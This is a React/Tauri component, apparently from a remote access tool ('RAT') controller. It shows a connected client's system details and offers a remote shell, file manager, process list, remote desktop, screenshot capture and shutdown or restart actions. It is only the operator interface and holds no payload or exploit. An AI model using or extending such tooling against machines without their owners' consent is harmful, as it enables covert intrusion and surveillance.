import { useEffect, useState, useContext } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import { invoke } from "@tauri-apps/api/tauri";
import { RATClient } from "../../types";
import {
  fetchClientCmd,
  takeScreenshotCmd,
  handleSystemCommandCmd,
} from "../rat/RATCommands";
import { RATContext } from "../rat/RATContext";

export const ClientView: React.FC = () => {
  const { id } = useParams();
  const addr = id;
  const [client, setClient] = useState<RATClient | null>(null);
  const [loaded, setLoaded] = useState<boolean>(false);
  const [screenshot, setScreenshot] = useState<string | null>(null);

  // Use the RATContext for window management
  const ratContext = useContext(RATContext);
  if (!ratContext) throw new Error("RATContext not available");

  const { openClientWindow } = ratContext;

  const navigate = useNavigate();

  async function fetchClient() {
    console.log("Fetching client", addr);
    let ok: RATClient = await fetchClientCmd(addr);
    setClient(ok);
    setLoaded(true);
  }

  async function waitScreenshot() {
    listen("client_screenshot", (event) => {
      setScreenshot(event.payload as string);
    });
  }

  async function takeScreenshot(display: number) {
    console.log("Taking screenshot", addr, display);
    await takeScreenshotCmd(addr, display);
  }

  async function handleSystem(cmd: string) {
    await handleSystemCommandCmd(addr, cmd);
  }

  // Open Remote Desktop window using the simplified approach
  async function openRemoteDesktop() {
    if (!addr || !client) return;

    // Open remote desktop window - configuration will happen in the window itself
    const title = `Remote Desktop - ${client.username}@${client.hostname}`;

    await openClientWindow(
      addr,
      "remote-desktop",
      "/remote-desktop-window",
      title
    );
  }

  useEffect(() => {
    waitScreenshot();
  }, []);

  useEffect(() => {
    if (client && client.disconnected) {
      // Client disconnection is now handled by the RATProvider
      // Just navigate away from this page
      navigate("/clients");
    }
  }, [client, addr]);

  const fetchVec = (vec: string[]) => {
    let vecString = "\n";

    vec.forEach((v) => {
      vecString += `${v}\n`;
    });

    return vecString;
  };

  useEffect(() => {
    fetchClient();
  }, [addr]);

  return (
    <div className="client p-8 flex flex-1 flex-col overflow-auto w-full items-center">
      <div className="flex flex-row gap-8">
        {loaded && client != null ? (
          <div className="card bg-base-100 !min-w-[350px] shadow-xl border border-base-content">
            <div className="card-body" style={{ whiteSpace: "pre-line" }}>
              <h2 className="card-title">System Information</h2>
              <a>OS: {client.os}</a>
              <a>Username: {client.username}</a>
              <a>Hostname: {client.hostname}</a>
              <a>Account Type: {client.is_elevated ? "Admin" : "User"}</a>
              <a>IP Address: {client.ip}</a>
              <a>CPU: {client.cpu}</a>
              <a>RAM: {client.ram}</a>
              <a>GPUs: {fetchVec(client.gpus)}</a>
              <a>Drives: {fetchVec(client.storage)}</a>

              <div className="card bg-base-100 shadow-xl border border-base-content mt-4">
                <div className="card-body">
                  <h2 className="card-title">Remote Management</h2>
                  <a
                    onClick={() => navigate(`/clients/${addr}/files`)}
                    className="btn btn-active"
                  >
                    File Manager
                  </a>
                  <a
                    onClick={() => navigate(`/clients/${addr}/shell`)}
                    className="btn btn-active"
                  >
                    Remote Shell
                  </a>
                  <a
                    onClick={() => navigate(`/clients/${addr}/process`)}
                    className="btn btn-active"
                  >
                    Process List
                  </a>
                  <a onClick={openRemoteDesktop} className="btn btn-active">
                    Remote Desktop
                  </a>
                </div>
              </div>

              <div className="card bg-base-100 shadow-xl border border-base-content mt-4">
                <div className="card-body">
                  <h2 className="card-title">System Actions</h2>
                  <a
                    onClick={() => handleSystem("shutdown")}
                    className="btn btn-error"
                  >
                    Shutdown
                  </a>
                  <a
                    onClick={() => handleSystem("restart")}
                    className="btn btn-warning"
                  >
                    Restart
                  </a>
                  <a
                    onClick={() => handleSystem("logout")}
                    className="btn btn-info"
                  >
                    Log Out
                  </a>
                </div>
              </div>
            </div>
          </div>
        ) : (
          <div className="skeleton card bg-base-100 !min-w-[350px] shadow-xl border border-base-content"></div>
        )}

        <div className="card bg-base-100 shadow-xl border border-base-content">
          <h2 className="card-title pl-12 pt-8">System Desktop</h2>
          <figure className="px-10 pt-10">
            {screenshot ? (
              <img
                src={`data:image/png;base64,${screenshot}`}
                className="rounded-xl w-[100vh] aspect-video"
              />
            ) : (
              <div className="skeleton rounded-xl w-full aspect-video min-w-[100vh]"></div>
            )}
          </figure>
          <div className="card-body items-center text-center">
            <div className="flex flex-row gap-4">
              {client &&
                [...Array(client.displays).keys()].map((index) => (
                  <a
                    key={index}
                    onClick={() => takeScreenshot(index)}
                    className="btn btn-active"
                  >
                    Display {index}
                  </a>
                ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
